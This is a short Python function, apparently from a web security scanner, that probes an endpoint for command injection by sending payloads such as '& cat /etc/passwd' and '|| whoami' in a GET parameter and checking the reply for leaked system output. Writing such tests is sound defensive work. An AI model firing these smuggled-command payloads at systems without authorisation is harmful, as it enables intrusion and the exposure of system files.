import requests

def command_injection_test(base_url, options=None):
    """
    Tests for simple command injection by sending OS command separators 
    (e.g., ; ls -la) as a GET parameter. Returns logs, score, and success flag.
    """
    if options is None:
        options = {}
    
    logs = []
    success = True
    score = 9  # Example severity score
    
    # Minimal set of command injection payloads
    payloads = [
        "; ls -la",
        "& cat /etc/passwd",
        "| dir",
        "|| whoami",
    ]
    
    endpoint = options.get("endpoint", "/execute")
    param_name = options.get("param_name", "cmd")
    
    for payload in payloads:
        url = f"{base_url.rstrip('/')}{endpoint}?{param_name}={payload}"
        try:
            response = requests.get(url, timeout=10)
            msg = f"[CmdInjection Test] Sent payload {payload} to {url} (Status: {response.status_code})"
            logs.append(msg)
            
            # Naive check for directory listings or user references in output
            if "root:x" in response.text or "Directory of" in response.text:
                detection = f"Possible command injection vulnerability with payload '{payload}'."
                logs.append(detection)
        except Exception as e:
            success = False
            error_msg = f"Error while testing command injection '{payload}': {str(e)}"
            logs.append(error_msg)
    
    return logs, score, success
